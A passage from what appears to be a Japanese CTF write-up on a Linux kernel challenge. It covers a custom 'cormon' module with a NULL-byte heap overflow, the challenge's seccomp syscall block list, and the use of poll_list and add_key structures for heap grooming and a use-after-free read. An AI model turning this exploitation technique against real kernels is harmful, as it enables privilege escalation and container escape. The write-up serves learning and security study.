</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (filtter[v] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>((name <span style=color:#f92672>=</span> get_syscall_name(v)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> n <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>((n <span style=color:#f92672>=</span> cpumask_next(n, <span style=color:#f92672>&amp;</span>__cpu_online_mask)) <span style=color:#f92672>&lt;</span> _nr_cpu_ids) {
</span></span><span style=display:flex><span>      seq_printf(sfp, <span style=color:#e6db74>&#34;%10sllu&#34;</span>, <span style=color:#e6db74>&#34;CPU&#34;</span>, __per_cpu_syscall_count[v]); <span style=color:#75715e>// PER_CPU macro?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>    seq_printf(sfp, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>%s (%lld)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, name, v);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (v <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x1B9</span>) seq_putc(sfp, <span style=color:#ae81ff>0xA</span>);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>cormon_seq_next</span>(<span style=color:#66d9ef>struct</span> seq_file <span style=color:#f92672>*</span>fp, <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>v, loff_t <span style=color:#f92672>*</span>pos_p) {
</span></span><span style=display:flex><span>  loff_t pos <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>pos_p;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>pos_p<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pos <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x1BA</span>) <span style=color:#66d9ef>return</span> pos_p;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>cormon_seq_stop</span>(<span style=color:#66d9ef>struct</span> seq_file <span style=color:#f92672>*</span>fp, <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>v) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>cormon_seq_start</span>(<span style=color:#66d9ef>struct</span> seq_file <span style=color:#f92672>*</span>fp, loff_t <span style=color:#f92672>*</span>pos_p) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>pos_p <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x1BA</span>) <span style=color:#66d9ef>return</span> pos_p;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>まぁ内容は簡単なのでrev自体はそんなに難しくないです。
やっていることとしては、上述のpatchによって導入されたPERCPUな変数<code>__per_cpu_syscall_count</code>を表示するインタフェースを作っています。このカウンタはpatchされたsyscallの先頭において<code>__SYSCALL_COUNT()</code>でインクリメントされます。このインクリメントは、モジュール内の<code>filter</code>には関係なく全てのsyscallに対して行われます。<code>cormon</code>モジュールは、<code>proc</code>に生やしたファイルを<code>read</code>することで<code>filter</code>が有効になっているsyscallの統計結果だけを表示しているようにしており、また書き込みを行うことで<code>filter</code>の値を更新することができるように成っています。<code>update_filter()</code>を見るとわかるように、更新方法は<code>/proc_rw/cormon</code>にsyscallの名前をカンマ区切りで書き込みます(Dockerの起動時に<code>-v /proc/cormon:/proc_rw/cormon:rw</code>としてホストのデバイスファイルをゲストにRWでバインドマウントしています)。
実際に使ってみるとこんな感じ:</p><p><img src=cj-bull.png alt="CoROS, actually Debian BullsEye"></p><h3 id=seccomp>seccomp</h3><p><code>seccomp.json</code>(のちに<code>corjail.json</code>としてVM内にコピーされる)には、以下のように<code>defaultAction: SCMP_ACT_ERRNO</code>でフィルターが設定されています:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-seccomp.json data-lang=seccomp.json><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;defaultAction&#34;</span>: <span style=color:#e6db74>&#34;SCMP_ACT_ERRNO&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;defaultErrnoRet&#34;</span>: <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;syscalls&#34;</span>: [
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;names&#34;</span>: [ <span style=color:#e6db74>&#34;_llseek&#34;</span>, <span style=color:#e6db74>&#34;_newselect&#34;</span>, <span style=color:#960050;background-color:#1e0010>(snipped...)</span>],
</span></span><span style=display:flex><span>			<span style=color:#f92672>&#34;action&#34;</span>: <span style=color:#e6db74>&#34;SCMP_ACT_ALLOW&#34;</span>
</span></span><span style=display:flex><span>		},
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#f92672>&#34;names&#34;</span>: [ <span style=color:#e6db74>&#34;clone&#34;</span> ],
</span></span><span style=display:flex><span>			<span style=color:#f92672>&#34;action&#34;</span>: <span style=color:#e6db74>&#34;SCMP_ACT_ALLOW&#34;</span>,
</span></span><span style=display:flex><span>			<span style=color:#f92672>&#34;args&#34;</span>: [ { <span style=color:#f92672>&#34;index&#34;</span>: <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#ae81ff>2114060288</span>, <span style=color:#f92672>&#34;op&#34;</span>: <span style=color:#e6db74>&#34;SCMP_CMP_MASKED_EQ&#34;</span> } ]
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>許可されていないsyscallは、おおよそ以下のとおりです(雑に比較したので多少ずれはあるかも):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-disallowed.txt data-lang=disallowed.txt><span style=display:flex><span>msgget
</span></span><span style=display:flex><span>msgsnd
</span></span><span style=display:flex><span>msgrcv
</span></span><span style=display:flex><span>msgctl
</span></span><span style=display:flex><span>ptrace
</span></span><span style=display:flex><span>syslog
</span></span><span style=display:flex><span>uselib
</span></span><span style=display:flex><span>personality
</span></span><span style=display:flex><span>ustat
</span></span><span style=display:flex><span>sysfs
</span></span><span style=display:flex><span>vhangup
</span></span><span style=display:flex><span>pivot_root
</span></span><span style=display:flex><span>_sysctl
</span></span><span style=display:flex><span>chroot
</span></span><span style=display:flex><span>acct
</span></span><span style=display:flex><span>settimeofday
</span></span><span style=display:flex><span>mount
</span></span><span style=display:flex><span>umount2
</span></span><span style=display:flex><span>swapon
</span></span><span style=display:flex><span>swapoff
</span></span><span style=display:flex><span>reboot
</span></span><span style=display:flex><span>sethostname
</span></span><span style=display:flex><span>setdomainname
</span></span><span style=display:flex><span>iopl
</span></span><span style=display:flex><span>ioperm
</span></span><span style=display:flex><span>create_module
</span></span><span style=display:flex><span>init_module
</span></span><span style=display:flex><span>delete_module
</span></span><span style=display:flex><span>get_kernel_syms
</span></span><span style=display:flex><span>query_module
</span></span><span style=display:flex><span>quotactl
</span></span><span style=display:flex><span>nfsservctl
</span></span><span style=display:flex><span>getpmsg
</span></span><span style=display:flex><span>putpmsg
</span></span><span style=display:flex><span>afs_syscall
</span></span><span style=display:flex><span>tuxcall
</span></span><span style=display:flex><span>security
</span></span><span style=display:flex><span>lookup_dcookie
</span></span><span style=display:flex><span>clock_settime
</span></span><span style=display:flex><span>vserver
</span></span><span style=display:flex><span>mbind
</span></span><span style=display:flex><span>set_mempolicy
</span></span><span style=display:flex><span>get_mempolicy
</span></span><span style=display:flex><span>mq_open
</span></span><span style=display:flex><span>mq_unlink
</span></span><span style=display:flex><span>mq_timedsend
</span></span><span style=display:flex><span>mq_timedreceive
</span></span><span style=display:flex><span>mq_notify
</span></span><span style=display:flex><span>mq_getsetattr
</span></span><span style=display:flex><span>kexec_load
</span></span><span style=display:flex><span>request_key
</span></span><span style=display:flex><span>migrate_pages
</span></span><span style=display:flex><span>unshare
</span></span><span style=display:flex><span>move_pages
</span></span><span style=display:flex><span>perf_event_open
</span></span><span style=display:flex><span>fanotify_init
</span></span><span style=display:flex><span>name_to_handle_at
</span></span><span style=display:flex><span>open_by_handle_at
</span></span><span style=display:flex><span>setns
</span></span><span style=display:flex><span>process_vm_readv
</span></span><span style=display:flex><span>process_vm_writev
</span></span><span style=display:flex><span>kcmp
</span></span><span style=display:flex><span>finit_module
</span></span><span style=display:flex><span>kexec_file_load
</span></span><span style=display:flex><span>bpf
</span></span><span style=display:flex><span>userfaultfd
</span></span><span style=display:flex><span>pkey_mprotect
</span></span><span style=display:flex><span>pkey_alloc
</span></span><span style=display:flex><span>pkey_free
</span></span></code></pre></div><p><code>unshare, mount, msgget, msgsnd, userfaultfd, bpf</code>らへんが禁止されていますね。</p><p>ちなみに、Ubuntu22.04環境でpthreadを含めてstatic buildしたバイナリをコンテナ上で動かそうとしたところ、<code>Operation not permitted</code>になりました。<a href=https://blog.jp.square-enix.com/iteng-blog/posts/00016-wsl2-gui-seccomp-issue/>Dockerには多分seccompでひっかかったsyscallのレポート機能がない</a>ため、手動と勘で問題になっているsyscallを探したところ、<code>clone3</code> syscallが問題になっているようでした。よって、<code>seccomp.json</code>に以下のようなパッチを当てました(writeupを見た感じ、pthreadの使用は意図しているため、pthreadを含む環境の違いっぽい?):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-seccomp.patch data-lang=seccomp.patch><span style=display:flex><span><span style=color:#f92672>--- a/../build/coros/files/docker/seccomp.json
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/./seccomp.json
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -10,6 +10,10 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                        &#34;names&#34;: [ &#34;clone&#34; ],
</span></span><span style=display:flex><span>                        &#34;action&#34;: &#34;SCMP_ACT_ALLOW&#34;,
</span></span><span style=display:flex><span>                        &#34;args&#34;: [ { &#34;index&#34;: 0, &#34;value&#34;: 2114060288, &#34;op&#34;: &#34;SCMP_CMP_MASKED_EQ&#34; } ]
</span></span><span style=display:flex><span><span style=color:#a6e22e>+               },
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+               {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                       &#34;names&#34;: [ &#34;clone3&#34; ],
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                       &#34;action&#34;: &#34;SCMP_ACT_ALLOW&#34;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>                }
</span></span><span style=display:flex><span>        ]
</span></span><span style=display:flex><span> }
</span></span></code></pre></div><h2 id=vuln-null-byte-overflow>Vuln: NULL-byte overflow</h2><p>バグはGhidraのデコンパイル結果を見ると明らかです。
<code>common_proc_write()</code>ではユーザから渡されたsyscallの文字列を<code>heap</code>(kmalloc-4k)にコピーしています。その後、<code>heap</code>の最後をNULL終端しようとしていますが、<code>size</code>が<code>0x1000</code>の時にNULL-byte overflowするようになっています:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=display:flex><span>common_proc_write() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>&lt;</span> size) sz <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xFFF</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (copy_from_user(heap, ubuf, sz) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {...}
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  heap[sz] <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>使われるスラブキャッシュは<code>kmalloc-4k</code>です。<a href=https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628>コレ</a>とかを見ると、まぁ使えそうな構造体はあるように思えますが、今回はseccompでフィルターされているため1K以上のキャッシュで使える構造体はこのリストには見当たりません。最近のkernelpwn追ってないしここでお手上げに成ったので、writeupをカンニングしました、チート最高！</p><h2 id=pre-requisites>pre-requisites</h2><h3 id=sys_poll><code>sys_poll</code></h3><p><code>sys_poll()</code>が使えるらしい。ソースはこんな感じ(余計なところは省略している):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fs/select/select.c data-lang=fs/select/select.c><span style=display:flex><span><span style=color:#75715e>#define FRONTEND_STACK_ALLOC	256
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define POLL_STACK_ALLOC	FRONTEND_STACK_ALLOC
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \
</span></span></span><span style=display:flex><span><span style=color:#75715e>			sizeof(struct pollfd))
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))            
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> pollfd {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> fd;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>short</span> events;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>short</span> revents;
</span></span><span style=display:flex><span>}; <span style=color:#75715e>/* size: 8, cachelines: 1, members: 3 */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> poll_list {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> poll_list <span style=color:#f92672>*</span>next;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> len;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> pollfd entries[];
</span></span><span style=display:flex><span>}; <span style=color:#75715e>/* size: 16, cachelines: 1, members: 3 */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>do_sys_poll</span>(<span style=color:#66d9ef>struct</span> pollfd __user <span style=color:#f92672>*</span>ufds, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> nfds,
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>struct</span> timespec64 <span style=color:#f92672>*</span>end_time)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> poll_wqueues table;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>long</span> stack_pps[POLL_STACK_ALLOC<span style=color:#f92672>/</span><span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>long</span>)];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> poll_list <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> head <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> poll_list <span style=color:#f92672>*</span>)stack_pps;
</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>struct</span> poll_list <span style=color:#f92672>*</span>walk <span style=color:#f92672>=</span> head;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	len <span style=color:#f92672>=</span> min_t(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>, nfds, N_STACK_PPS);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (;;) {
</span></span><span style=display:flex><span>		walk<span style=color:#f92672>-&gt;</span>next <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>		walk<span style=color:#f92672>-&gt;</span>len <span style=color:#f92672>=</span> len;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>len)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (copy_from_user(walk<span style=color:#f92672>-&gt;</span>entries, ufds <span style=color:#f92672>+</span> nfds<span style=color:#f92672>-</span>todo,
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> pollfd) <span style=color:#f92672>*</span> walk<span style=color:#f92672>-&gt;</span>len))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>goto</span> out_fds;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		todo <span style=color:#f92672>-=</span> walk<span style=color:#f92672>-&gt;</span>len;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>todo)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		len <span style=color:#f92672>=</span> min(todo, POLLFD_PER_PAGE);
</span></span><span style=display:flex><span>		walk <span style=color:#f92672>=</span> walk<span style=color:#f92672>-&gt;</span>next <span style=color:#f92672>=</span> kmalloc(struct_size(walk, entries, len),
</span></span><span style=display:flex><span>					    GFP_KERNEL);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>walk) {
</span></span><span style=display:flex><span>			err <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>ENOMEM;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>goto</span> out_fds;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	fdcount <span style=color:#f92672>=</span> do_poll(head, <span style=color:#f92672>&amp;</span>table, end_time);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	err <span style=color:#f92672>=</span> fdcount;
</span></span><span style=display:flex><span>out_fds:
</span></span><span style=display:flex><span>	walk <span style=color:#f92672>=</span> head<span style=color:#f92672>-&gt;</span>next;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span> (walk) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>struct</span> poll_list <span style=color:#f92672>*</span>pos <span style=color:#f92672>=</span> walk;
</span></span><span style=display:flex><span>		walk <span style=color:#f92672>=</span> walk<span style=color:#f92672>-&gt;</span>next;
</span></span><span style=display:flex><span>		kfree(pos);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> err;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>まずユーザランドから渡された<code>pollfd</code>リストをスタック上の<code>stack_pps</code>に最大256byte分コピーします。厳密には、<code>next, len</code>メンバ分の16byteを除いた240byte分(つまり<code>struct pollfd</code>の30個分)をスタック上にコピーします。もしそれ以上の<code>ufds</code>が渡された場合には、次は最大で<code>POLLFD_PER_PAGE ((4096-16)/8 == 510)</code>個数分だけ<code>kmalloc()</code>してコピーします。つまり、使われるスラブキャッシュはkmalloc-32 ~ kmalloc-4kのどれか(<code>next, len</code>の分があるためkmalloc-16以下には入らない)です。こうして、256byteのstackと、32~4Kのheapに<code>struct poll_list</code>と<code>pollfd</code>をコピーしたあと、それらを<code>next</code>ポインタで繋いでリストを作っています。freeは、リストの先頭から順に<code>kfree</code>で単純に解放してます。
なるほど、たしかにこの構造体はkmalloc-32~4kの任意のサイズのキャッシュへのポインタを持つことができて、且つfreeはタイマーでも任意のタイミングでもできるため便利そう。
前述のNULL-byte overflowを使って<code>struct pollfd</code>の<code>next</code>をpartial overwriteすることで、そのスラブに入っているオブジェクトをUAF(read)できそうです。問題は、<code>msgXXX</code>系のsyscallがフィルターされている状況で、どの構造体を使ってreadするか。</p><h3 id=add_key--keyctl-syscall><code>add_key</code> / <code>keyctl</code> syscall</h3><p>まぁ勿論カンニングしたんですが。<code>add_key</code>というシステムコールがあるらしい。知らんがな。そういえば、seccompのフィルターを見ると<a href=https://docs.docker.com/engine/security/seccomp/>デフォルトの設定</a>では許可されていないのにこの問題では許可されています。ソースはこんな感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fs/select.c data-lang=fs/select.c><span style=display:flex><span><span style=color:#75715e>// security/keys/user_defined.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> key_type key_type_user <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>	.name			<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;user&#34;</span>,
</span></span><span style=display:flex><span>	.preparse		<span style=color:#f92672>=</span> user_preparse,
</span></span><span style=display:flex><span>	.free_preparse		<span style=color:#f92672>=</span> user_free_preparse,
</span></span><span style=display:flex><span>	.instantiate		<span style=color:#f92672>=</span> generic_key_instantiate,
</span></span><span style=display:flex><span>	.update			<span style=color:#f92672>=</span> user_update,
</span></span><span style=display:flex><span>	.revoke			<span style=color:#f92672>=</span> user_revoke,
</span></span><span style=display:flex><span>	.destroy		<span style=color:#f92672>=</span> user_destroy,
</span></span><span style=display:flex><span>	.describe		<span style=color:#f92672>=</span> user_describe,
</span></span><span style=display:flex><span>	.read			<span style=color:#f92672>=</span> user_read,
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>user_preparse</span>(<span style=color:#66d9ef>struct</span> key_preparsed_payload <span style=color:#f92672>*</span>prep)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> user_key_payload <span style=color:#f92672>*</span>upayload;
</span></span><span style=display:flex><span>  size_t datalen <span style=color:#f92672>=</span> prep<span style=color:#f92672>-&gt;</span>datalen;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (datalen <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> datalen <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>32767</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>prep<span style=color:#f92672>-&gt;</span>data)
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span>EINVAL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  upayload <span style=color:#f92672>=</span> kmalloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#f92672>*</span>upayload) <span style=color:#f92672>+</span> datalen, GFP_KERNEL);
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// security/keys/keyctl.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>SYSCALL_DEFINE5(add_key, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span>, _type,
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span>, _description, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> __user <span style=color:#f92672>*</span>, _payload,
</span></span><span style=display:flex><span>		size_t, plen, key_serial_t, ringid)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  key_ref_t keyring_ref, key_ref;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> type[<span style=color:#ae81ff>32</span>], <span style=color:#f92672>*</span>description;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>payload;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> ret;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* draw all the data into kernel space */</span>
</span></span><span style=display:flex><span>  ret <span style=color:#f92672>=</span> key_get_type_from_user(type, _type, <span style=color:#66d9ef>sizeof</span>(type));
</span></span><span style=display:flex><span>  description <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (_description) {...}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* pull the payload in if one was supplied */</span>
</span></span><span style=display:flex><span>  payload <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (plen) {
</span></span><span style=display:flex><span>      ...
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (copy_from_user(payload, _payload, plen) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>goto</span> error3;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  keyring_ref <span style=color:#f92672>=</span> lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
</span></span><span style=display:flex><span>  key_ref <span style=color:#f92672>=</span> key_create_or_update(keyring_ref, type, description,
</span></span><span style=display:flex><span>                     payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// security/keys/key.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>key_ref_t key_create_or_update(key_ref_t keyring_ref,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>type,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>description,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>payload,
</span></span><span style=display:flex><span>			       size_t plen,
</span></span><span style=display:flex><span>			       key_perm_t perm,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> flags)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> keyring_index_key index_key <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>      .description	<span style=color:#f92672>=</span> description,
</span></span><span style=display:flex><span>  };
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> key_preparsed_payload prep;                       
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>  index_key.type <span style=color:#f92672>=</span> key_type_lookup(type);
</span></span><span style=display:flex><span>  memset(<span style=color:#f92672>&amp;</span>prep, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(prep));
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (index_key.type<span style=color:#f92672>-&gt;</span>preparse) {
</span></span><span style=display:flex><span>      ret <span style=color:#f92672>=</span> index_key.type<span style=color:#f92672>-&gt;</span>preparse(<span style=color:#f92672>&amp;</span>prep);
</span></span><span style=display:flex><span>      ...
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  ret <span style=color:#f92672>=</span> __key_instantiate_and_link(key, <span style=color:#f92672>&amp;</span>prep, keyring, NULL, <span style=color:#f92672>&amp;</span>edit);
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>}
